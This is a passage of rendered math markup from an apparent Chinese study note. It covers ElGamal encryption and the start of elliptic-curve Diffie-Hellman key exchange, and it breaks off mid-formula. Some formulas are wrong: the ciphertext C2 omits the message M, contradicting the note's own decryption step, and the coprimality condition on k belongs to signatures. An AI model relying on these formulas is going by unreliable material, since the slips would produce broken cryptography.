<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>首先选择一个素数</mtext><mi>p</mi><mtext>和两个小于</mtext><mi>p</mi><mtext>的随机数</mtext><mi>g</mi><mtext>和</mtext><mi>x</mi><mtext>，计算</mtext><mi>y</mi><mo>≡</mo><msup><mi>g</mi><mi>x</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mi mathvariant="normal">.</mi><mtext>以</mtext><mo stretchy="false">(</mo><mi>y</mi><mo separator="true">,</mo><mi>g</mi><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo><mtext>作为公钥，</mtext><mi>x</mi><mtext>作为私钥</mtext></mrow><annotation encoding="application/x-tex">首先选择一个素数p和两个小于p的随机数g和x，计算y\equiv g^xmodp.以(y,g,p)作为公钥，x作为私钥
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">择</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mord">.</span><span class="mord cjk_fallback">以</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">钥</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">私</span><span class="mord cjk_fallback">钥</span></span></span></span></span></p>
<p>加密明文 M</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>首先选择一个和</mtext><mi>p</mi><mo>−</mo><mn>1</mn><mtext>互素的整数</mtext><mi>k</mi><mtext>，计算</mtext><msub><mi>C</mi><mn>1</mn></msub><mo>≡</mo><msup><mi>g</mi><mi>k</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo separator="true">,</mo><msub><mi>C</mi><mn>2</mn></msub><mo>≡</mo><msup><mi>y</mi><mi>k</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo separator="true">,</mo><mtext>密文</mtext><mi>C</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>C</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>C</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">首先选择一个和p-1互素的整数k，计算C_1 \equiv g^kmodp,C_2 \equiv y^kmod p,密文C=(C_1,C_2)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">择</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord cjk_fallback">互</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">文</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p>解密</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mo>=</mo><mfrac><msub><mi>C</mi><mn>2</mn></msub><msubsup><mi>C</mi><mn>1</mn><mi>X</mi></msubsup></mfrac><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo>=</mo><mfrac><mrow><msup><mi>y</mi><mi>k</mi></msup><mi>M</mi></mrow><msup><mi>g</mi><mrow><mi>k</mi><mi>x</mi></mrow></msup></mfrac><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo>=</mo><mfrac><mrow><msup><mi>y</mi><mi>k</mi></msup><mi>M</mi></mrow><msup><mi>y</mi><mi>k</mi></msup></mfrac><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo>=</mo><mi>M</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">M= \frac{C_2}{C_1^X}modp=\frac{y^kM}{g^{kx}}modp=\frac {y^kM}{y^{k}}modp=Mmodp
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.339769em;vertical-align:-0.979439em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.286869em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8231310000000001em;"><span style="top:-2.433692em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.979439em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.406548em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5261079999999998em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7751079999999999em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.406548em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5261079999999998em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7751079999999999em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span></span></span></span></p>
<h2 id="基于椭圆曲线的-diffie-hellman-密钥交换"><a class="anchor" href="#基于椭圆曲线的-diffie-hellman-密钥交换">#</a> 基于椭圆曲线的 Diffie-Hellman 密钥交换</h2>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>首先约定好一个</mtext><mi>A</mi><mi>b</mi><mi>e</mi><mi>l</mi><mtext>群构成的</mtext><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mtext>的一个生成元</mtext><mi>G</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>G</mi><mtext>的阶要满足素数并且</mtext><mi>n</mi><mi>G</mi><mo>=</mo><mi>O</mi><mtext>（</mtext><mi>n</mi><mo>∈</mo><mtext>最小正整数）</mtext><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mtext>和</mtext><mi>G</mi><mtext>作为公开参数。</mtext></mrow><annotation encoding="application/x-tex">首先约定好一个Abel群构成的E_p(a,b),E_p(a,b)的一个生成元G(x_1,y_1)\\G的阶要满足素数并且nG=O（n\in最小正整数）E_p(a,b)和G作为公开参数。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">约</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">好</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord mathnormal">A</span><span class="mord mathnormal">b</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord cjk_fallback">群</span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">的</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">元</span><span class="mord mathnormal">G</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">阶</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord mathnormal">n</span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">）</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal">G</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>令</mtext><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi><mtext>保存</mtext><msub><mi>n</mi><mi>A</mi></msub><mo separator="true">,</mo><mi>B</mi><mi>o</mi><mi>b</mi><mtext>保存</mtext><msub><mi>n</mi><mi>B</mi></msub><mspace width="1em"/><mi>P</mi><mo>=</mo><msub><mi>n</mi><mi>p</mi></msub><mi>G</mi><mtext>产生</mtext><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mtext>上的一点作为公开钥</mtext><mspace linebreak="newline"></mspace><mtext>计算</mtext><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi><mtext>的</mtext><mi>K</mi><mo>=</mo><msub><mi>n</mi><mi>A</mi></msub><msub><mi>P</mi><mi>B</mi></msub><mo separator="true">,</mo><mi>B</mi><mi>o</mi><mi>b</mi><mtext>的</mtext><mi>K</mi><mo>=</mo><msub><mi>n</mi><mi>B</mi></msub><msub><mi>P</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">令Alice保存n_A,Bob保存n_B\quad P=n_pG产生E_p(a,b)上的一点作为公开钥\\计算Alice的K=n_AP_B,Bob的 K=n_BP_A
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">令</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">保</span><span class="mord cjk_fallback">存</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">o</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">保</span><span class="mord cjk_fallback">存</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathnormal">G</span><span class="mord cjk_fallback">产</span><span class="mord cjk_fallback">生</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">钥</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord 